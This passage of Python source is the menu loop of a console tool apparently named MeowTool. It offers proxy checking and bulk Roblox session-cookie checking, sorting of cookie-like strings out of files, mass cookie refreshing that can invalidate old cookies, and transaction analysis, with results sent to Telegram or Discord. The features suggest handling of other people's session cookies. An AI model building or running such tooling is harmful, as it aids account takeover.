                    cmdWriter(f' {generateVisualPath(MT_Proxy)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                    proxyTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                    match proxyTab:
                        case '0':
                            whileTrueStage1 = False
                        # Чекер (PC)
                        case '1':
                            whileTrueStage2 = True
                            removeLines(7)
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Proxy, MT_Checker)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Available_Formats}:\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}user:pass@ip:port\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}ip:port:user:pass\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}ip:port\n\n')
                                PCFiles = getFiles(Path('Proxy', 'Checker'), isPrintFiles=True)
                                cmdWriter(f'{'  ┃\n' if PCFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.FG.WHITE}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}G{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Output_Total'])} {MT_Output_Total}\n [{ANSI.FG.YELLOW}L{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Amount_Of_Lines_In_Files'])} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Play_Sound_At_The_End_Of_The_Work'])} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                proxyCheckerTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match proxyCheckerTab:
                                    case proxyCheckerTab if proxyCheckerTab.startswith('0'):
                                        if len(proxyCheckerTab) == 1:
                                            whileTrueStage2 = False
                                    case proxyCheckerTab if (proxyCheckerTab.isdigit() and int(proxyCheckerTab) <= len(PCFiles)):
                                        await proxyChecker(PCFiles[int(proxyCheckerTab) - 1])
                                    case 'G' | 'П':
                                        config['Outputs']['Output_Total'] ^= True
                                    case 'L' | 'Д':
                                        config['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                    case 'S' | 'Ы':
                                        config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        playSystemSound()
                                    case 'T' | 'Е':
                                        config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                labelASCII()
                                autoSaveConfigAndRemoveLinesInSettings(proxyCheckerTab, ('G', 'П', 'L', 'Д', 'S', 'Ы', 'T', 'Е', 'D', 'В'), (), 0)
                        case 'F' | 'А':
                            labelASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                        case _:   
                            removeLines(7)
                    
                    autoSaveConfigAndRemoveLinesInSettings(proxyTab, (), ('0', 'R', 'К'), 7)
            # Роблокс
            case '2':
                removeLines(mainDecorators[0])
                whileTrueStage1 = True
                while whileTrueStage1:
                    cmdWriter(f' {generateVisualPath(MT_Roblox)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Cookie_Checker}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Cookie_Sorter}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Cookie_Refresher} ({MT_Tickets})\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Transaction_Analysis}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_Misc}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                    robloxTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                    match robloxTab:
                        case '0':
                            whileTrueStage1 = False
                        # Куки чекер (RCC)
                        case '1':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Checker)}\n\n')
                                RCCFiles = getFiles(Path('Roblox', 'Cookie Checker'), isPrintFiles=True)
                                cmdWriter(f'{'  ┃\n' if RCCFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.FG.WHITE}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}G{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Output_Total'])} {MT_Output_Total}\n [{ANSI.FG.YELLOW}P{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Proxy']['Use_Proxy'])} {MT_Use_Proxy}\n [{ANSI.FG.YELLOW}L{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Amount_Of_Lines_In_Files'])} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Play_Sound_At_The_End_Of_The_Work'])} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                robloxCookieCheckerTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match robloxCookieCheckerTab:
                                    case robloxCookieCheckerTab if robloxCookieCheckerTab.startswith('0'):
                                        if len(robloxCookieCheckerTab) == 1:
                                            whileTrueStage2 = False
                                    case robloxCookieCheckerTab if (robloxCookieCheckerTab.isdigit() and int(robloxCookieCheckerTab) <= len(RCCFiles)):
                                        await robloxCookieChecker(RCCFiles[int(robloxCookieCheckerTab) - 1])
                                    case 'G' | 'П':
                                        config['Outputs']['Output_Total'] ^= True
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Proxy']['Use_Proxy'] ^= True
                                    case 'L' | 'Д':
                                        config['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                    case 'S' | 'Ы':
                                        config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        playSystemSound()
                                    case 'T' | 'Е':
                                        config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                labelASCII()
                                autoSaveConfigAndRemoveLinesInSettings(robloxCookieCheckerTab, ('G', 'П', 'P', 'З', 'L', 'Д', 'S', 'Ы', 'T', 'Е', 'D', 'В'), (), 0)
                        # Куки сортер (RCS)
                        case '2':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Sorter)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Start_Sorting}\n  ┃\n [{ANSI.FG.YELLOW}N{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieSorter']['Search_For_Strings_Similar_To_Roblox_Cookie'])} {MT_Search_For_Strings_Similar_To_Roblox_Cookie}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Play_Sound_At_The_End_Of_The_Work'])} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                robloxCookieSorterTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match robloxCookieSorterTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    case '1':
                                        await robloxCookieSorter()
                                    case 'N' | 'Т':
                                        config['Roblox']['CookieSorter']['Search_For_Strings_Similar_To_Roblox_Cookie'] ^= True
                                    case 'S' | 'Ы':
                                        config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        playSystemSound()
                                    case 'T' | 'Е':
                                        config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(11)

                                autoSaveConfigAndRemoveLinesInSettings(robloxCookieSorterTab, ('N', 'Т', 'S', 'Ы', 'T', 'Е', 'D', 'В'), ('0', 'N', 'Т', 'S', 'Ы', 'T', 'Е', 'D', 'В', 'R', 'К'), 11)
                        # Куки рефрешер (RCR)
                        case '3':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Single_Mode}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Mass_Mode}\n  ┃\n [{ANSI.FG.YELLOW}B{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieRefresher']['Break_Old_Cookies'])} {MT_Break_Old_Cookies}\n [{ANSI.FG.YELLOW}P{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Proxy']['Use_Proxy'])} {MT_Use_Proxy}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                robloxCookieRefresherTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match robloxCookieRefresherTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    # Одиночный режим
                                    case '1':
                                        removeLines(10)
                                        cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Single_Mode)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                        robloxCookieRefresherCookieEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_Cookie[0]}: ').strip()
                                        if robloxCookieRefresherCookieEnter == '0':
                                            removeLines(5)
                                        else:
                                            await cookieRefresherSingleMode(robloxCookieRefresherCookieEnter)
                                    # Массовый режим
                                    case '2':
                                        removeLines(10)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Refresher, MT_Mass_Mode)}\n\n')
                                            RCRFiles = getFiles(Path('Roblox', 'Cookie Refresher', 'Mass Mode'), isPrintFiles=True)
                                            cmdWriter(f'{'  ┃\n' if RCRFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.FG.WHITE}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}L{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Amount_Of_Lines_In_Files'])} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Play_Sound_At_The_End_Of_The_Work'])} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')    
                                            robloxCookieRefresherMassModeTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match robloxCookieRefresherMassModeTab:
                                                case robloxCookieRefresherMassModeTab if robloxCookieRefresherMassModeTab.startswith('0'):
                                                    if len(robloxCookieRefresherMassModeTab) == 1:
                                                        whileTrueStage3 = False
                                                case robloxCookieRefresherMassModeTab if (robloxCookieRefresherMassModeTab.isdigit() and int(robloxCookieRefresherMassModeTab) <= len(RCRFiles)):
                                                    await cookieRefresherMassMode(RCRFiles[int(robloxCookieRefresherMassModeTab) - 1])
                                                case 'L' | 'Д':
                                                    config['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                                case 'S' | 'Ы':
                                                    config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                                    playSystemSound()
                                                case 'T' | 'Е':
                                                    config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                                case 'D' | 'В':
                                                    config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                            labelASCII()
                                            autoSaveConfigAndRemoveLinesInSettings(robloxCookieRefresherMassModeTab, ('S', 'Ы', 'P', 'З', 'T', 'Е', 'D', 'В'), (), 0)
                                    case 'B' | 'И':
                                        config['Roblox']['CookieRefresher']['Break_Old_Cookies'] ^= True
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Proxy']['Use_Proxy'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case 'F' | 'А':
                                        labelASCII()
                                    case _:
                                        removeLines(10)

                                autoSaveConfigAndRemoveLinesInSettings(robloxCookieRefresherTab, ('B', 'И', 'P', 'З'), ('0', 'B', 'И', 'P', 'З', 'R', 'К'), 10)
                        # Анализ транзакций (RTA)
                        case '4':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Transaction_Analysis)}\n\n')
                                RTAFiles = getFiles(Path('Roblox', 'Transaction Analysis'), isPrintFiles=True)
                                cmdWriter(f'{'  ┃\n' if RTAFiles else ''} [{ANSI.FG.YELLOW}U{ANSI.FG.WHITE}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}G{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Output_Total'])} {MT_Output_Total}\n [{ANSI.FG.YELLOW}P{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Proxy']['Use_Proxy'])} {MT_Use_Proxy}\n [{ANSI.FG.YELLOW}L{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Amount_Of_Lines_In_Files'])} {MT_Show_Amount_Of_Lines_In_Files}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Play_Sound_At_The_End_Of_The_Work'])} {MT_Play_The_Sound_At_The_End_Of_The_Work}\n [{ANSI.FG.YELLOW}T{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n [{ANSI.FG.YELLOW}D{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                transactionAnalysisTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match transactionAnalysisTab:
                                    case transactionAnalysisTab if transactionAnalysisTab.startswith('0'):
                                        if len(transactionAnalysisTab) == 1:
                                            whileTrueStage2 = False
                                    case transactionAnalysisTab if (transactionAnalysisTab.isdigit() and int(transactionAnalysisTab) <= len(RTAFiles)):
                                        await robloxTransactionAnalysis(RTAFiles[int(transactionAnalysisTab) - 1])
                                    case 'G' | 'П':
                                        config['Outputs']['Output_Total'] ^= True
                                    case 'P' | 'З':
                                        config['Roblox']['General']['Proxy']['Use_Proxy'] ^= True
                                    case 'L' | 'Д':
                                        config['General']['Show_Amount_Of_Lines_In_Files'] ^= True
                                    case 'S' | 'Ы':
                                        config['Outputs']['Play_Sound_At_The_End_Of_The_Work'] ^= True
                                        playSystemSound()
                                    case 'T' | 'Е':
                                        config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                    case 'D' | 'В':
                                        config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                labelASCII()
                                autoSaveConfigAndRemoveLinesInSettings(transactionAnalysisTab, ('G', 'П', 'S', 'Ы', 'P', 'З', 'T', 'Е', 'D', 'В'), (), 0)
                        # Разное
                        case '5':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Misc)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Gamepasses_Parser_From_The_Place}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Badges_Parser_From_The_Place}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Upload_All_Info_Gamepasses_And_Badges}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                robloxMiscTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match robloxMiscTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    # Парсер геймпассов, Парсер бейджей
                                    case '1' | '2':
                                        removeLines(9)
                                        columnarHeaders = [MT_Id, MT_Name, MT_Link]
                                        infoMisc = {
                                            '1': {
                                                'category'     : 'Gamepasses',
                                                'categoryUrl'  : 'game-pass',
                                                'trLabel'      : MT_Gamepasses,
                                                'trLabelError' : MT_The_Place_Has_No_Gamepasses,
                                                'url'          : 'https://apis.roblox.com/game-passes/v1/universes/{}/game-passes?pageSize=101',
                                                'key'          : 'gamePasses',
                                                'visualPath'   : generateVisualPath(MT_Roblox, MT_Misc, MT_Gamepasses_Parser_From_The_Place)
                                            },
                                            '2': {
                                                'category'     : 'Badges',
                                                'categoryUrl'  : 'badges',
                                                'trLabel'      : MT_Badges,
                                                'trLabelError' : MT_The_Place_Has_No_Badges,
                                                'url'          : 'https://badges.roblox.com/v1/universes/{}/badges?limit=100&sortOrder=Asc',
                                                'key'          : 'data',
                                                'visualPath'   : generateVisualPath(MT_Roblox, MT_Misc, MT_Badges_Parser_From_The_Place)
                                            }
                                        }[robloxMiscTab]
                                        miscParsePlaceGamepassesOrBadgesTab = input(f' {infoMisc['visualPath']}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_The_Place_ID}: ').strip()
                                        await parsePlaceItemsRoblox(infoMisc, miscParsePlaceGamepassesOrBadgesTab, columnarHeaders)
                                        labelASCII()
                                    # Выгрузка геймпассов и бейджей используемые программой
                                    case '3':
                                        allItemsPath = Path('Roblox', 'Misc', 'All gamepasses and badges from program')
                                        (allItemsPath / 'Gamepasses').mkdir(parents=True, exist_ok=True)
                                        (allItemsPath / 'Badges').mkdir(parents=True, exist_ok=True)
                                        for place in listOfPlaces:
                                            placeName = rmPatternFromString(SPECIAL_CHARS, place.placeNames[0])
                                            if hasattr(place, 'Gamepasses'):
                                                allGamepasses = [[gamepass[1], gamepass[0], f'https://www.roblox.com/game-pass/{gamepass[1]}'] for gamepass in place.Gamepasses.listOfGamepasses]
                                                with open(allItemsPath / 'Gamepasses' / f'{place.placeNames[3]} ({placeName}).txt', 'w', encoding='utf-8') as file:
                                                    file.write(f'\n  Meow :3\n\n  {MT_Place_ID}: {place.placeNames[3]}\n  {MT_Place_Name}: {place.placeNames[0]}\n  {MT_Place_Link}: https://www.roblox.com/games/{place.placeNames[3]}\n\n  [*] {MT_Gamepasses}\n{columnar(allGamepasses, columnarHeaders, no_borders=True)}')
                                            if hasattr(place, 'Badges'):
                                                allBadges = [[badge[1], badge[0], f'https://www.roblox.com/badges/{badge[1]}'] for badge in place.Badges.listOfBadges]
                                                with open(allItemsPath / 'Badges' / f'{place.placeNames[3]} ({placeName}).txt', 'w', encoding='utf-8') as file:
                                                    file.write(f'\n  Meow :3\n\n  {MT_Place_ID}: {place.placeNames[3]}\n  {MT_Place_Name}: {place.placeNames[0]}\n  {MT_Place_Link}: https://www.roblox.com/games/{place.placeNames[3]}\n\n  [*] {MT_Badges}\n{columnar(allBadges, columnarHeaders, no_borders=True)}')    
                                        errorOrCorrectHandler(False, f'{MT_Successfully_Uploaded_In} \'Roblox{OS_SEP}Misc{OS_SEP}All gamepasses and badges from program\'', generateVisualPath(MT_Roblox, MT_Misc))
                                    case 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(9)

                                autoSaveConfigAndRemoveLinesInSettings(robloxMiscTab, (), ('0', 'R', 'К'), 9)
                        case 'F' | 'А':
                            labelASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                        case _:
                            removeLines(11)

                    autoSaveConfigAndRemoveLinesInSettings(robloxTab, (), ('0', 'R', 'К'), 11)
            # Настройки
            case 's' | 'S' | 'ы' | 'Ы':
                removeLines(mainDecorators[0])
                whileTrueStage1 = True
                while whileTrueStage1:
                    cmdWriter(f' {generateVisualPath(MT_Settings)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Outputs}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Proxy}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Roblox}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_Configs}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                    settingsTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                    match settingsTab:
                        case '0':
                            whileTrueStage1 = False
                        # Общие
                        case '1':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_General)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Language}: {'English' if config['General']['Language'] == 'EN' else 'Русский'}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Updates}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Console_Title}: {config['General']['Console_Title'][:50]}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Label_MeowTool'])} {MT_Show_Label_MeowTool}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Show_Label_by_h1kken'])} {MT_Show_Label_by_h1kken}\n [{ANSI.FG.PINK}6{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Disable_Warnings_For_Links'])} {MT_Disable_Warnings_For_Links}\n [{ANSI.FG.PINK}7{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['General']['Disable_Warnings_For_Dangerous_Actions'])} {MT_Disable_Warnings_For_Dangerous_Actions}\n [{ANSI.FG.PINK}8{ANSI.FG.WHITE}] ┃ {MT_Fix_Console} ({MT_Bind}: F)\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                settingsGeneralTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match settingsGeneralTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    # Язык
                                    case '1':
                                        removeLines(14)
                                        languageOptions = {'1': 'RU', '2': 'EN'}
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_General, MT_Language)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(str(config['General']['Language']).upper() == 'RU')} Русский\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(str(config['General']['Language']).upper() == 'EN')} English\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsLanguageTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsLanguageTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1' | '2':
                                                    config['General']['Language'] = languageOptions[settingsLanguageTab]
                                                    translateMT(config['General']['Language'])
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(8)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsLanguageTab, ('1', '2'), ('0', '1', '2', 'R', 'К'), 8)
                                    # Обновления
                                    case '2':
                                        removeLines(14)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_General, MT_Updates)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configLoader['Updater']['Check_For_Updates'])} {MT_Check_For_Updates}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configLoader['Updater']['Save_Old_Versions'])} {MT_Save_Old_Versions}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsUpdatesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsUpdatesTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    configLoader['Updater']['Check_For_Updates'] ^= True
                                                    autoSaveConfigLoader()
                                                case '2':
                                                    configLoader['Updater']['Save_Old_Versions'] ^= True
                                                    autoSaveConfigLoader()
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(8)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsUpdatesTab, ('1', '2'), ('0', '1', '2', 'R', 'К'), 8)
                                    case '3':
                                        removeLines(12)
                                        cmdWriter(f' [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_Not_Use_This_Characters}: >, <, |, ^, &\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                        settingsTitleEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_New_Title}: ')
